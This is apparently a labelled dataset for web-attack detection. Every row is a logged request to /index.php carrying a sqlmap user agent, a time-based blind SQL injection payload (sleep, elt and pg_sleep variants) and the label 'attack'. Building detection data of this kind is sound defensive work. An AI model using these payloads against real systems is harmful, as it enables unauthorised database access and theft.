/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' rlike (select * from (select(sleep(5)))wboo) and 'wqwj' like 'wqwj,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"") rlike (select * from (select(sleep(5)))wboo) and (""onpp""=""onpp",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"")) rlike (select * from (select(sleep(5)))wboo) and ((""qafs""=""qafs",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs""))) rlike (select * from (select(sleep(5)))wboo) and (((""lmla""=""lmla",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"") rlike (select * from (select(sleep(5)))wboo) and (""lzkv"" like ""lzkv",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"")) rlike (select * from (select(sleep(5)))wboo) and ((""lmtq"" like ""lmtq",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%') rlike (select * from (select(sleep(5)))wboo) and ('%'=',attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%"") rlike (select * from (select(sleep(5)))wboo) and (""%""=""",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%"" rlike (select * from (select(sleep(5)))wboo) and ""%""=""",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' where 5056=5056 rlike (select * from (select(sleep(5)))wboo)-- gwnl,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs') as iqfg where 4546=4546 rlike (select * from (select(sleep(5)))wboo)-- wtzt,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' in boolean mode) rlike (select * from (select(sleep(5)))wboo)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs)) rlike (select * from (select(sleep(5)))wboo) and ((4042=4042,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs rlike (select * from (select(sleep(5)))wboo),attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs rlike (select * from (select(sleep(5)))wboo)-- nxix,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs) where 2948=2948 rlike (select * from (select(sleep(5)))wboo)-- nshp,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs where 1079=1079 rlike (select * from (select(sleep(5)))wboo)-- rzuq,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs` where 9043=9043 rlike (select * from (select(sleep(5)))wboo)-- lntb,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs') rlike (select * from (select(sleep(5)))jdzr)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs')) rlike (select * from (select(sleep(5)))jdzr)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs'))) rlike (select * from (select(sleep(5)))jdzr)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"")) rlike (select * from (select(sleep(5)))jdzr)#",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs""))) rlike (select * from (select(sleep(5)))jdzr)#",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%') rlike (select * from (select(sleep(5)))jdzr)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%')) rlike (select * from (select(sleep(5)))jdzr)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%' rlike (select * from (select(sleep(5)))jdzr)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%"") rlike (select * from (select(sleep(5)))jdzr)#",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' where 9736=9736 rlike (select * from (select(sleep(5)))jdzr)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs') as dhzz where 9165=9165 rlike (select * from (select(sleep(5)))jdzr)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' in boolean mode) rlike (select * from (select(sleep(5)))jdzr)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs) rlike (select * from (select(sleep(5)))jdzr)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs)) rlike (select * from (select(sleep(5)))jdzr)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs))) rlike (select * from (select(sleep(5)))jdzr)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs) where 2892=2892 rlike (select * from (select(sleep(5)))jdzr)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs where 6905=6905 rlike (select * from (select(sleep(5)))jdzr)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs) as phci where 2289=2289 rlike (select * from (select(sleep(5)))jdzr)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs` where 7827=7827 rlike (select * from (select(sleep(5)))jdzr)#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs') and elt(8080=8080,sleep(5))-- duqv",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs' and elt(8080=8080,sleep(5))-- ovau",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs') and elt(8080=8080,sleep(5)) and ('uatl'='uatl",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs')) and elt(8080=8080,sleep(5)) and (('yjcw'='yjcw",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs' and elt(8080=8080,sleep(5)) and 'tszj'='tszj",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs') and elt(8080=8080,sleep(5)) and ('yghu' like 'yghu",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs'))) and elt(8080=8080,sleep(5)) and ((('kcjo' like 'kcjo",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs' and elt(8080=8080,sleep(5)) and 'aoey' like 'aoey",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"") and elt(8080=8080,sleep(5)) and (""pfcj""=""pfcj",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"")) and elt(8080=8080,sleep(5)) and ((""utjj""=""utjj",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"") and elt(8080=8080,sleep(5)) and (""yhxh"" like ""yhxh",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"")) and elt(8080=8080,sleep(5)) and ((""igpj"" like ""igpj",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"" and elt(8080=8080,sleep(5)) and ""fcmp"" like ""fcmp",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%') and elt(8080=8080,sleep(5)) and ('%'='",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%')) and elt(8080=8080,sleep(5)) and (('%'='",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%' and elt(8080=8080,sleep(5)) and '%'='",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%"") and elt(8080=8080,sleep(5)) and (""%""=""",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%"" and elt(8080=8080,sleep(5)) and ""%""=""",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs') as wlih where 1716=1716 and elt(8080=8080,sleep(5))-- kcbq",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs' in boolean mode) and elt(8080=8080,sleep(5))#",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs) and elt(8080=8080,sleep(5))-- khmz",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs) and elt(8080=8080,sleep(5)) and (5714=5714",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs))) and elt(8080=8080,sleep(5)) and (((2274=2274",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs and elt(8080=8080,sleep(5))",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs and elt(8080=8080,sleep(5))-- bcwt",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs and elt(8080=8080,sleep(5))# vlqx",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs) where 1336=1336 and elt(8080=8080,sleep(5))-- pgwu",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs where 8118=8118 and elt(8080=8080,sleep(5))-- qvbb",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs) as xdft where 5258=5258 and elt(8080=8080,sleep(5))-- jouf",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs') and 9929=(select 9929 from pg_sleep(5))-- mged,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' and 9929=(select 9929 from pg_sleep(5))-- laff,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs') and 9929=(select 9929 from pg_sleep(5)) and ('eblq'='eblq,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs')) and 9929=(select 9929 from pg_sleep(5)) and (('stnr'='stnr,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs'))) and 9929=(select 9929 from pg_sleep(5)) and ((('ihna'='ihna,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' and 9929=(select 9929 from pg_sleep(5)) and 'pely'='pely,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs')) and 9929=(select 9929 from pg_sleep(5)) and (('cbgt' like 'cbgt,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs'))) and 9929=(select 9929 from pg_sleep(5)) and ((('aiir' like 'aiir,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' and 9929=(select 9929 from pg_sleep(5)) and 'vzsd' like 'vzsd,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"") and 9929=(select 9929 from pg_sleep(5)) and (""tqah""=""tqah",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"")) and 9929=(select 9929 from pg_sleep(5)) and ((""gkxk""=""gkxk",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs""))) and 9929=(select 9929 from pg_sleep(5)) and (((""ifmk""=""ifmk",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"") and 9929=(select 9929 from pg_sleep(5)) and (""cycw"" like ""cycw",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"" and 9929=(select 9929 from pg_sleep(5)) and ""qqms"" like ""qqms",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%')) and 9929=(select 9929 from pg_sleep(5)) and (('%'=',attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%'))) and 9929=(select 9929 from pg_sleep(5)) and ((('%'=',attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%' and 9929=(select 9929 from pg_sleep(5)) and '%'=',attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%"" and 9929=(select 9929 from pg_sleep(5)) and ""%""=""",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' where 2562=2562 and 9929=(select 9929 from pg_sleep(5))-- etjg,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs') as yqjz where 6312=6312 and 9929=(select 9929 from pg_sleep(5))-- apla,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs) and 9929=(select 9929 from pg_sleep(5))-- hwmh,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs)) and 9929=(select 9929 from pg_sleep(5)) and ((2078=2078,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs))) and 9929=(select 9929 from pg_sleep(5)) and (((3191=3191,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs and 9929=(select 9929 from pg_sleep(5)),attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs and 9929=(select 9929 from pg_sleep(5))# ifyc,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs) where 3987=3987 and 9929=(select 9929 from pg_sleep(5))-- smqx,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs where 1581=1581 and 9929=(select 9929 from pg_sleep(5))-- ugss,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs) as vmvp where 8812=8812 and 9929=(select 9929 from pg_sleep(5))-- xbge,attack
